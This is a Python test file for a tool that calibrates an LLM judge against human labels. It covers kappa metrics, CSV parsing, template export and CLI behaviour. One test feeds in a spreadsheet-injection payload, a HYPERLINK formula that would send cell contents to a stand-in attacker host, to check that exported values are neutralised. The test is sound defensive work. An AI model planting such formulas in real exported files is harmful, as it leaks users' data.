"""Judge calibration (SPEC §12): metrics, CSV rules, join order, template, golden and CLI."""

import csv
import io
import json
from pathlib import Path

import pytest
from rich.console import Console
from typer.testing import CliRunner

from casegate.calibrate import (
    LabelRow,
    calibrate,
    read_labels,
    render_calibration_md,
    write_template,
)
from casegate.cli import app
from casegate.console import render_calibration
from casegate.errors import SuiteError
from casegate.models import Run
from tests.conftest import assert_golden
from tests.test_report import load

LABELS = Path(__file__).parent / "fixtures" / "labels.csv"
BASELINE = Path(__file__).parent / "fixtures" / "runs" / "baseline.json"
HEADER = "case_id,repeat,scorer,human_pass,note\n"
runner = CliRunner()


def write_csv(tmp_path: Path, body: str, header: str = HEADER) -> Path:
    path = tmp_path / "labels.csv"
    path.write_text(header + body, encoding="utf-8")
    return path


def label(case_id: str, repeat: int, human: bool | None, scorer: str = "llm_judge") -> LabelRow:
    return LabelRow(line=2, case_id=case_id, repeat=repeat, scorer=scorer, human_pass=human)


def test_golden_md() -> None:
    cal = calibrate(load("baseline"), read_labels(LABELS))
    assert_golden("calibrate.md", render_calibration_md(cal))


def test_metrics_match_hand_computation() -> None:
    cal = calibrate(load("baseline"), read_labels(LABELS))
    # 10 joined rows: judge passes 7, human passes 6, 7 agree.
    # po = 0.7; pe = 0.7*0.6 + 0.3*0.4 = 0.54; kappa = (0.7 - 0.54) / (1 - 0.54) = 0.3478...
    assert cal.n == 10
    assert cal.agreement == pytest.approx(0.7)
    assert cal.kappa == pytest.approx(0.16 / 0.46)
    assert cal.confusion == {"jp_hp": 5, "jp_hf": 2, "jf_hp": 1, "jf_hf": 2}
    assert cal.notes == []
    keys = [(d.case_id, d.repeat, d.judge_passed, d.human_pass) for d in cal.disagreements]
    assert keys == [
        ("refund-within-cap-01", 2, True, False),
        ("unknown-order-08", 3, True, False),
        ("policy-timeline-11", 1, False, True),
    ]
    assert cal.disagreements[0].judge_reason == "fixture judge refund-within-cap-01 r2"


def test_unmatched_rows_and_empty_rows_are_skipped() -> None:
    cal = calibrate(load("baseline"), read_labels(LABELS))
    # The empty policy-giftcard-13 row is skipped, not unmatched; a deterministic scorer
    # and an unknown case are unmatched without --scorer.
    assert [(r.line, r.case_id, r.scorer) for r in cal.unmatched] == [
        (13, "refund-within-cap-01", "exact"),
        (14, "ghost-case-99", "llm_judge"),
    ]


def test_kappa_undefined_with_one_class() -> None:
    labels = [label("refund-within-cap-01", k, True) for k in range(3)]
    cal = calibrate(load("baseline"), labels)
    assert (cal.n, cal.agreement, cal.kappa) == (3, 1.0, None)
    assert cal.notes == ["kappa undefined: one class only"]
    md = render_calibration_md(cal)
    assert "kappa undefined · n 3" in md
    assert "> [!NOTE]\n> kappa undefined: one class only" in md
    console = Console(file=io.StringIO(), width=100, no_color=True, force_terminal=False)
    render_calibration(console, cal)
    out = console.file.getvalue()  # type: ignore[attr-defined]
    assert "⚠ kappa undefined: one class only" in out and "Disagreements" not in out


def test_no_labelled_rows() -> None:
    cal = calibrate(load("baseline"), [label("refund-within-cap-01", 0, None)])
    assert (cal.n, cal.agreement, cal.kappa, cal.unmatched) == (0, None, None, [])
    assert cal.notes == ["no labelled rows"]
    assert "**agreement —** · kappa undefined · n 0" in render_calibration_md(cal)


def test_scorer_option_replaces_judge_filter() -> None:
    labels = [
        label("refund-over-cap-adv", 0, True, scorer="no-over-cap-attempt"),
        label("refund-over-cap-adv", 1, True),  # a judge row: excluded by --scorer
    ]
    cal = calibrate(load("baseline"), labels, scorer="no-over-cap-attempt")
    assert cal.n == 1
    assert [r.scorer for r in cal.unmatched] == ["llm_judge"]


def test_read_labels_values_and_extra_columns(tmp_path: Path) -> None:
    body = "a,0,llm_judge,TRUE,x,ignored\nb,1,llm_judge,no,,\nc, 2 ,llm_judge,,,\n"
    rows = read_labels(
        write_csv(tmp_path, body, header="case_id,repeat,scorer,human_pass,note,extra\n")
    )
    assert [(r.line, r.case_id, r.repeat, r.human_pass, r.note) for r in rows] == [
        (2, "a", 0, True, "x"),
        (3, "b", 1, False, ""),
        (4, "c", 2, None, ""),
    ]


def test_columns_in_any_order(tmp_path: Path) -> None:
    path = write_csv(
        tmp_path, "yes,llm_judge,3,a,\n", header="human_pass,scorer,repeat,case_id,note\n"
    )
    assert read_labels(path)[0] == LabelRow(
        line=2, case_id="a", repeat=3, scorer="llm_judge", human_pass=True
    )


def errors_of(path: Path) -> list[str]:
    with pytest.raises(SuiteError) as info:
        read_labels(path)
    return info.value.errors


def test_missing_column(tmp_path: Path) -> None:
    path = write_csv(tmp_path, "a,0,llm_judge,1\n", header="case_id,repeat,scorer,human_pass\n")
    assert errors_of(path) == ["labels.csv: missing column note"]


def test_bad_values_name_their_line(tmp_path: Path) -> None:
    path = write_csv(tmp_path, "a,0,llm_judge,maybe,\nb,one,llm_judge,1,\n")
    assert errors_of(path) == [
        "labels.csv:2: invalid human_pass 'maybe' (use 1/0/true/false/yes/no)",
        "labels.csv:3: repeat must be an int, got 'one'",
    ]


def test_duplicate_key_counts_empty_rows(tmp_path: Path) -> None:
    path = write_csv(tmp_path, "a,0,llm_judge,1,\na,0,llm_judge,,\n")
    assert errors_of(path) == [
        "labels.csv:3: duplicate row ('a', 0, 'llm_judge') (first on line 2)"
    ]


def test_parse_errors_come_before_duplicates(tmp_path: Path) -> None:
    # Join step 1 (parse every row) fails first, so the duplicate is not reported yet.
    path = write_csv(tmp_path, "a,0,llm_judge,1,\na,0,llm_judge,1,\nb,0,llm_judge,2,\n")
    assert errors_of(path) == ["labels.csv:4: invalid human_pass '2' (use 1/0/true/false/yes/no)"]


def test_missing_file(tmp_path: Path) -> None:
    errors = errors_of(tmp_path / "nope.csv")
    assert len(errors) == 1 and errors[0].startswith("nope.csv: cannot read labels:")


def test_non_utf8_file_is_bad_input(tmp_path: Path) -> None:
    # A spreadsheet can save cp1252; that is exit 2 with a message, not a traceback (exit 1).
    path = tmp_path / "labels.csv"
    path.write_bytes(b"case_id,repeat,scorer,human_pass,note\na,0,llm_judge,1,caf\xe9\n")
    errors = errors_of(path)
    assert len(errors) == 1 and errors[0].startswith("labels.csv: cannot read labels:")


def run_with_error_repeat() -> Run:
    """The baseline with a long multi-line reply, and one error repeat that kept its judge score."""
    run = load("baseline")
    case = next(c for c in run.cases if c.id == "refund-within-cap-01")
    first = case.repeats[0]
    assert first.output is not None
    first.output.text = "line one\nline two\r\n" + "x" * 300
    second = case.repeats[1]
    case.repeats[1] = second.model_copy(update={"status": "error", "output": None})
    return run


def test_template_rows_and_lf_line_ends() -> None:
    out = io.StringIO()
    write_template(run_with_error_repeat(), out)
    text = out.getvalue()
    assert "\r" not in text  # csv.writer defaults to \r\n; the template uses \n
    rows = list(csv.reader(io.StringIO(text)))
    assert rows[0] == [
        "case_id",
        "repeat",
        "scorer",
        "human_pass",
        "note",
        "judge_value",
        "judge_passed",
        "judge_reason",
        "reply_excerpt",
    ]
    assert len(rows) == 1 + 45  # every judge score in the fixture run, nothing else
    first, error_row = rows[1], rows[2]
    assert first[:8] == [
        "refund-within-cap-01",
        "0",
        "llm_judge",
        "",
        "",
        "1.000",
        "1",
        "fixture judge refund-within-cap-01 r0",
    ]
    assert first[8] == ("line one line two " + "x" * 300)[:200]
    assert error_row[:3] == ["refund-within-cap-01", "1", "llm_judge"] and error_row[8] == ""
    assert {r[2] for r in rows[1:]} == {"llm_judge", "citation_support"}


def test_template_neutralises_spreadsheet_formulas() -> None:
    run = load("baseline")
    case = next(c for c in run.cases if c.id == "refund-within-cap-01")
    rep = case.repeats[0]
    assert rep.output is not None
    rep.output.text = '=HYPERLINK("http://evil.example/?"&A1,"click")'
    next(s for s in rep.scores if s.type == "llm_judge").reason = "@SUM(1+1)"
    out = io.StringIO()
    write_template(run, out)
    first = list(csv.reader(io.StringIO(out.getvalue())))[1]
    assert first[7] == "'@SUM(1+1)"
    assert first[8].startswith("'=HYPERLINK(")


def test_template_round_trips_through_read_labels(tmp_path: Path) -> None:
    path = tmp_path / "labels.csv"
    with path.open("w", encoding="utf-8", newline="") as fh:
        write_template(load("baseline"), fh, scorer="no-over-cap-attempt")
    rows = read_labels(path)
    assert [(r.case_id, r.repeat, r.human_pass) for r in rows] == [
        ("refund-over-cap-adv", k, None) for k in range(5)
    ]


def test_render_calibration_plain() -> None:
    console = Console(file=io.StringIO(), width=100, no_color=True, force_terminal=False)
    render_calibration(console, calibrate(load("baseline"), read_labels(LABELS)))
    out = console.file.getvalue()  # type: ignore[attr-defined]
    assert "\x1b[" not in out
    assert out.splitlines()[0] == "agreement 0.700  kappa 0.35  n 10"
    assert "Disagreements (3)" in out and "Unmatched rows (2)" in out


def test_cli_formats_and_exit_codes(tmp_path: Path) -> None:
    base = ["calibrate", "--labels", str(LABELS), "--run", str(BASELINE)]
    md = runner.invoke(app, [*base, "--format", "md"])
    assert md.exit_code == 0 and md.output.startswith("## casegate calibrate\n")
    js = runner.invoke(app, [*base, "--format", "json"])
    assert js.exit_code == 0 and js.output.endswith("}\n")
    assert json.loads(js.output)["n"] == 10
    text = runner.invoke(app, [*base, "--plain"])
    assert text.exit_code == 0 and "agreement 0.700  kappa 0.35  n 10" in text.output

    bad = write_csv(tmp_path, "a,x,llm_judge,1,\n")
    failed = runner.invoke(app, ["calibrate", "--labels", str(bad), "--run", str(BASELINE)])
    assert failed.exit_code == 2 and "labels.csv:2: repeat must be an int" in failed.output
    assert runner.invoke(app, ["calibrate", "--run", str(BASELINE)]).exit_code == 2
    assert runner.invoke(app, [*base, "--format", "html"]).exit_code == 2


def test_cli_template() -> None:
    result = runner.invoke(app, ["calibrate", "--template", "--run", str(BASELINE)])
    assert result.exit_code == 0
    lines = result.output.split("\n")
    assert lines[0].startswith("case_id,repeat,scorer,human_pass,note,judge_value")
    assert len(lines) == 1 + 45 + 1  # header, 45 rows, and the empty string after the last \n
